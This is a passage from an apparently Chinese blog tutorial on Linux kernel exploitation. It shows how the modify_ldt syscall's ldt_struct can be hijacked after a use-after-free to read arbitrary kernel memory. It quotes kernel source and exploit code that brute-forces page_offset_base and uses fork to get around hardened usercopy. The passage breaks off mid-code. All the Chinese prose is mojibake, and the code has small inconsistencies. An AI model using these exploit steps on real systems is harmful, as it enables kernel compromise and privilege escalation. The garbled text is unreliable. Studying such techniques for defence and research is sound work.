<p>ä¹Ÿå°±æ˜¯ä¼ å…¥syscallç›¸å…³å‚æ•°ï¼Œä¼šè°ƒç”¨ä¸åŒå‡½æ•°ï¼Œ0å¯¹åº”<code>read_ldt</code>ï¼Œ1å¯¹åº”<code>write_ldt</code>(å…¶å®0x11çš„ä¹Ÿå·®ä¸å¤šï¼Œå°±æ˜¯<code>oldmode</code>è®¾ç½®ä¸º0äº†è€Œå·²ï¼Œå…·ä½“çš„è¿˜å¾—ä¾æ®æºç è¿›è¡Œåˆ†æ)ï¼Œä¾æ­¤çœ‹ä»£ç ç±»ä¼¼å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//read_ldtä»ldt_struct-&gt;entriesè¯»å–8å­—èŠ‚ç»™buf</span></span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//write_ldtä¾æ®ä¼ å…¥çš„bufæ•°æ®å’Œ sizeof(desc)åˆ›å»ºä¸€ä¸ªæ–°çš„ldt_structç»“æ„ä½“</span></span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;buf, <span class="keyword">sizeof</span>(buf));</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å®ç°ä»»æ„è¯»å–"   >
          <a href="#2-å®ç°ä»»æ„è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å®ç°ä»»æ„è¯»å–" class="headerlink" title="(2)å®ç°ä»»æ„è¯»å–"></a>(2)å®ç°ä»»æ„è¯»å–</h3>
      <p>ä¸»è¦çœ‹<code>write_ldt</code>å’Œ<code>read_ldt</code>å‡½æ•°ï¼Œç”±äºè°ƒç”¨<code>write_ldt</code>å‡½æ•°æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„<code>ldt_struct</code>ä¸€äº›å’Œåˆ©ç”¨æ— å…³çš„ä»£ç å°±å…ˆçœç•¥äº†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/kernel/ldt.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.........//</span></span><br><span class="line">    <span class="comment">//ä»ç”¨æˆ·æ•°æ®æ‹·è´sizeof(ldt_info)æ•°æ®ç»™ldt_info</span></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//.........//</span></span><br><span class="line">    <span class="comment">//ä¾æ®ä¸€äº›æ¡ä»¶æ¥è¿›è¡Œå¤„ç†</span></span><br><span class="line">	<span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">	    LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">		<span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">		<span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//seg_32bitæœ€å¥½ç›´æ¥è®¾ç½®ä¸º1,ä¸è®¾ç½®å…¶å®ä¹Ÿä¸ä¼šè¿›å»å•¦,</span></span><br><span class="line">        <span class="comment">//allow_16bit_segmentsåŸºæœ¬éƒ½ä¼šè¿”å›true</span></span><br><span class="line">		<span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;</span><br><span class="line">			error = -EINVAL;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static bool allow_16bit_segments(void)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	if (!IS_ENABLED(CONFIG_X86_16BIT))</span></span><br><span class="line"><span class="comment">		return false;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#ifdef CONFIG_XEN_PV</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	 * Xen PV does not implement ESPFIX64, which means that 16-bit</span></span><br><span class="line"><span class="comment">	 * segments will not work correctly.  Until either Xen PV implements</span></span><br><span class="line"><span class="comment">	 * ESPFIX64 and can signal this fact to the guest or unless someone</span></span><br><span class="line"><span class="comment">	 * provides compelling evidence that allowing broken 16-bit segments</span></span><br><span class="line"><span class="comment">	 * is worthwhile, disallow 16-bit segments under Xen PV.</span></span><br><span class="line"><span class="comment">	if (xen_pv_domain()) &#123;</span></span><br><span class="line"><span class="comment">		pr_info_once(&quot;Warning: 16-bit segments do not work correctly in a Xen PV guest\n&quot;);</span></span><br><span class="line"><span class="comment">		return false;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	return true;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">		<span class="comment">//ä¸€äº›ç›¸å…³çš„è®¾ç½®,ä¼šå¯¼è‡´ldté‡Œçš„æ•°æ®è¢«æ›´æ”¹</span></span><br><span class="line">		fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">		<span class="keyword">if</span> (oldmode)</span><br><span class="line">			ldt.avl = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static inline void fill_ldt(struct desc_struct *desc, const struct user_desc *info)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	desc-&gt;limit0		= info-&gt;limit &amp; 0x0ffff;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;base0		= (info-&gt;base_addr &amp; 0x0000ffff);</span></span><br><span class="line"><span class="comment">	desc-&gt;base1		= (info-&gt;base_addr &amp; 0x00ff0000) &gt;&gt; 16;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;type		= (info-&gt;read_exec_only ^ 1) &lt;&lt; 1;</span></span><br><span class="line"><span class="comment">	desc-&gt;type	       |= info-&gt;contents &lt;&lt; 2;</span></span><br><span class="line"><span class="comment">	//Set the ACCESS bit so it can be mapped RO</span></span><br><span class="line"><span class="comment">	desc-&gt;type	       |= 1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;s			= 1;</span></span><br><span class="line"><span class="comment">	desc-&gt;dpl		= 0x3;</span></span><br><span class="line"><span class="comment">	desc-&gt;p			= info-&gt;seg_not_present ^ 1;</span></span><br><span class="line"><span class="comment">	desc-&gt;limit1		= (info-&gt;limit &amp; 0xf0000) &gt;&gt; 16;</span></span><br><span class="line"><span class="comment">	desc-&gt;avl		= info-&gt;useable;</span></span><br><span class="line"><span class="comment">	desc-&gt;d			= info-&gt;seg_32bit;</span></span><br><span class="line"><span class="comment">	desc-&gt;g			= info-&gt;limit_in_pages;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;base2		= (info-&gt;base_addr &amp; 0xff000000) &gt;&gt; 24;</span></span><br><span class="line"><span class="comment">	//</span></span><br><span class="line"><span class="comment">	 * Don&#x27;t allow setting of the lm bit. It would confuse</span></span><br><span class="line"><span class="comment">	 * user_64bit_mode and would get overridden by sysret anyway.</span></span><br><span class="line"><span class="comment">	desc-&gt;l			= 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//.......//</span></span><br><span class="line">    <span class="comment">//ä¾æ®sizeof(ldt_struct)ç”¨kmallocç”³è¯·chunkä½œä¸ºnew_ldt</span></span><br><span class="line">	new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	struct ldt_struct *new_ldt;</span></span><br><span class="line"><span class="comment">	unsigned int alloc_size;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	//.....//</span></span><br><span class="line"><span class="comment">	//ä¾æ®sizeof(ldt_struct)ç”¨kmallocç”³è¯·chunkä½œä¸ºnew_ldt</span></span><br><span class="line"><span class="comment">	new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL_ACCOUNT);</span></span><br><span class="line"><span class="comment">	//....//</span></span><br><span class="line"><span class="comment">	 </span></span><br><span class="line"><span class="comment">	if (alloc_size &gt; PAGE_SIZE)</span></span><br><span class="line"><span class="comment">		new_ldt-&gt;entries = __vmalloc(alloc_size, GFP_KERNEL_ACCOUNT | __GFP_ZERO);</span></span><br><span class="line"><span class="comment">	else</span></span><br><span class="line"><span class="comment">		new_ldt-&gt;entries = (void *)get_zeroed_page(GFP_KERNEL_ACCOUNT);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if (!new_ldt-&gt;entries) &#123;</span></span><br><span class="line"><span class="comment">		kfree(new_ldt);</span></span><br><span class="line"><span class="comment">		return NULL;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	//The new LDT isn&#x27;t aliased for PTI yet. </span></span><br><span class="line"><span class="comment">	new_ldt-&gt;slot = -1;</span></span><br><span class="line"><span class="comment">	new_ldt-&gt;nr_entries = num_entries;</span></span><br><span class="line"><span class="comment">	return new_ldt;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.......//</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è®¾ç½®æ–°ldt_structç»“æ„ä½“çš„entriesæŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä»ldtç»“æ„ä½“ä¸­æ‹·è´8ä¸ªå­—èŠ‚åˆ°å¯¹åº”ä½ç½®</span></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//......///</span></span><br><span class="line">    </span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">	unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">	free_ldt_struct(old_ldt);</span><br><span class="line">    <span class="comment">//......//</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>å°†æˆ‘ä»¬çš„ä¼ å…¥çš„æ•°æ®æŒ‡é’ˆ<code>ptr</code>ï¼Œå½“ä½œä¸€ä¸ª<code>user_desc</code>ç»“æ„ä½“æ‹·è´ç»™<code>ldt_info</code></li>
<li>ç„¶åä¾æ®<code>ldt_info</code>æ¥è®¾ç½®<code>desc_struct</code>ç»“æ„ä½“<code>ldt</code></li>
<li>ä¹‹åä¾æ®<code>sizeof(ldt_struct)</code>ç”¨<code>kmalloc</code>ç”³è¯·<code>chunk</code>ä½œä¸º<code>new_ldt</code></li>
<li>å¦‚æœå­˜åœ¨<code>old_ldt</code>ï¼Œé‚£ä¹ˆå°±å°†<code>old_ldt-&gt;entriesd</code>çš„æ•°æ®çš„æ‹·è´ç»™æ–°çš„<code>new_ldt-&gt;entries</code></li>
<li>æœ€åå°†<code>ldt</code>(8ä¸ªå­—èŠ‚)çš„å†…å®¹èµ‹å€¼ç»™<code>new_ldt-&gt;entries[ldt_info.entry_number]</code></li>
<li>åœ¨é€€å‡ºå‰è¿˜ä¼šæ’å…¥<code>new_ldt</code>å¹¶ä¸”è§£å¼€<code>old_ldt</code>ï¼Œé‡Šæ”¾<code>old_ldt</code></li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/include/uapi/asm/ldt.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v5.17 /arch/x86/include/asm/desc_defs.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">	u16	limit0;</span><br><span class="line">	u16	base0;</span><br><span class="line">	u16	base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">	u16	limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></div></figure>

<p>æ¯”å¦‚æœ‰ä¸ªUAFæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©è¯¥å‡½æ•°ï¼Œç”³è¯·0x10å¤§å°çš„å †å—ï¼Œä¿®æ”¹å…¶<code>entries</code>æŒ‡é’ˆï¼Œå†å€ŸåŠ©<code>read_ldt</code>å‡½æ•°è¿›è¡Œè¯»å–</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//......//</span></span><br><span class="line">    <span class="comment">//entries_sizeè‚¯å®šå¤§äº8192,é‚£ä¹ˆè‡³å°‘å¯æ‹·è´8192ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="comment">//#define LDT_ENTRIES    8192</span></span><br><span class="line">    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">    <span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">		entries_size = bytecount;</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">		retval = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//.....//</span></span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>å³è·å–å½“å‰è¿›ç¨‹ä¸­çš„<code>ldt_struct</code>ç»“æ„ä½“çš„<code>entries</code>æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ï¼Œæ‹·è´<code>bytecount</code>ä¸ªå­—èŠ‚ç»™ç”¨æˆ·</li>
</ul>
<p>é‚£ä¹ˆå½“å¦‚ä¸Šè¿°æ‰€ç¤ºï¼Œå€ŸåŠ©UAFä¿®æ”¹äº†<code>entries</code>æŒ‡é’ˆä¹‹åï¼Œå°±å¯ä»¥è¿›è¡Œä»»æ„åœ°å€è¯»å–æœ€å°‘å¯åˆ°è¾¾8192ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚</p>
<p>å¦‚æœæ²¡æœ‰åœ°å€çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨çˆ†ç ´çš„æ–¹æ³•æ¥è¯»å–å†…æ ¸åœ°å€ï¼Œå› ä¸ºå¦‚æœæ²¡æœ‰å‘½ä¸­å†…æ ¸ç©ºé—´<code>copy_to_user</code>ä¼šè¿”å›é0å€¼ï¼Œä½†æ˜¯å†…æ ¸ä¸ä¼šå´©æºƒï¼Œå€ŸåŠ©è¿™ç‚¹ç‰¹æ€§å¯ä»¥ç”¨æ¥çˆ†ç ´å†…æ ¸ç©ºé—´ã€‚</p>
<p>ä½†æ˜¯å¦‚æœå­˜åœ¨<code>harden_usercopy</code>å’Œ<code>KASLR</code>ï¼Œæœ€å¥½è¿˜æ˜¯å€ŸåŠ©<code>page_offset_base</code>å’Œ<code>fork</code>æ¥ä»çº¿æ€§åˆ†é…åŒºä¸­æœç´¢æ•°æ®ï¼Œä¸ç„¶å½“<code>copy_to_user</code>çš„æºåœ°å€ä¸ºå†…æ ¸ .text æ®µï¼ˆ_stext, _etextï¼‰æ—¶æˆ–è€…çº¿æ€§åˆ†é…åŒºä¸­çš„æ•°æ®è¾ƒä¸ºç‰¹æ®Šæ—¶ä¼šå¼•èµ·<code>kernel panic</code>ï¼Œè‡´ä½¿å†…æ ¸å´©æºƒã€‚</p>
<p>åŸç†å°±æ˜¯åœ¨<code>fork</code>æ—¶æœ€ç»ˆè°ƒç”¨åˆ°çš„æ˜¯<code>ldt_dup_context</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°æœ‰å¦‚ä¸‹æ“ä½œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br></pre></td></tr></table></div></figure>

<p>ä¼šå°†çˆ¶è¿›ç¨‹çš„æ‹·è´ç»™å­è¿›ç¨‹ï¼Œå®Œå…¨åœ¨å†…æ ¸ä¸­çš„æ“ä½œï¼Œä¸ä¼šè§¦å‘<code>hardened usercopy</code>çš„æ£€æŸ¥ï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨çˆ¶è¿›ç¨‹ä¸­è®¾å®šå¥½æœç´¢çš„åœ°å€ä¹‹åæ‰“å¼€å­è¿›ç¨‹æ¥é€šè¿‡<code>read_ldt()</code>è¯»å–æ•°æ®å³å¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_offset;</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"><span class="keyword">size_t</span> searchAddr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœç´¢page_offset_base</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myChunk.len = <span class="number">0x8</span>;</span><br><span class="line">    myChunk.idx = <span class="number">0x0</span>;</span><br><span class="line">    myChunk.data = &amp;page_offset_base;<span class="comment">//change the entries</span></span><br><span class="line">    editFun(fd,&amp;myChunk);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);<span class="comment">//read_ldt 8 bytes form entries</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)<span class="comment">//judge yes or no</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»page_offset_baseä¸­æœç´¢å†…æ ¸å‡½æ•°åœ°å€</span></span><br><span class="line">searchAddr = page_offset_base;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myChunk.idx = <span class="number">0x0</span>;</span><br><span class="line">    myChunk.data = &amp;searchAddr</span><br><span class="line">    editFunc(fd, &amp;myChunk);<span class="comment">//ä¿®æ”¹entriesæŒ‡é’ˆ</span></span><br><span class="line">    retval = fork();</span><br><span class="line">    <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//è¯»å–0x8000æ•°æ®</span></span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//é€‰å–ç‰¹å¾æ•°æ®</span></span><br><span class="line">            <span class="keyword">if</span> ((buf[i] &gt;= <span class="number">0xffffffff81000000</span>)  &amp;&amp; ((buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x030</span>))</span><br><span class="line">            &#123;</span><br><span 